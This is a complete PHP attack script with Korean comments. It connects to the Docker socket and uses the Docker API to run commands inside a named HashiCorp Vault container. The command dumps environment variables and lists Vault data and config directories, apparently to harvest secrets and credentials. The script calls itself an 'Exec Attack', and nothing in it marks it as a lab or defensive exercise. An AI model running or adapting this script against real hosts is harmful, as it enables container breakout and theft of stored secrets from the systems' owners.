<?php
echo "[*] Direct Exec Attack into Vault Container (ID: 9efb0caf746b4)...\n";

// 1. Exec 인스턴스 생성
$sock = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock, "/var/run/docker.sock");

$target_id = "efb0caf746b4";
$exec_payload = json_encode([
    "AttachStdout" => true,
    "AttachStderr" => true,
    "Cmd" => ["sh", "-c", "echo '--- ENVIRONMENT VARS ---'; env; echo '--- VAULT FILES ---'; ls -la /vault/file/ 2>/dev/null; ls -la /vault/config/ 2>/dev/null"]
]);

// 핵심: Connection: close 추가하여 데드락 방지
$req1 = "POST /v1.41/containers/$target_id/exec HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: " . strlen($exec_payload) . "\r\n\r\n" . $exec_payload;
socket_write($sock, $req1);

$res1 = "";
while ($buf = socket_read($sock, 2048)) { $res1 .= $buf; }
socket_close($sock); // 첫 번째 통신 깔끔하게 종료

preg_match('/"Id":"([^"]+)"/', $res1, $matches);
if(empty($matches[1])) { die("[-] Failed to create exec instance.\n" . $res1 . "\n"); }
$exec_id = $matches[1];
echo "[+] Exec Instance Created: " . substr($exec_id, 0, 12) . "\n";

// 2. Exec 실행 (명령어 격발을 위해 새로운 소켓 연결)
echo "[*] Triggering Payload inside Vault...\n\n";
$sock2 = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock2, "/var/run/docker.sock");

$start_payload = json_encode(["Detach" => false, "Tty" => false]);
$req2 = "POST /v1.41/exec/$exec_id/start HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: " . strlen($start_payload) . "\r\n\r\n" . $start_payload;
socket_write($sock2, $req2);

// 결과 출력 (지저분한 도커 헤더 쓰레기값 제거)
while($out = socket_read($sock2, 2048)) {
    echo preg_replace('/[^\x20-\x7E\n]/', '', $out); 
}
socket_close($sock2);
echo "\n\n[*] Exec Attack Complete.\n";
?>
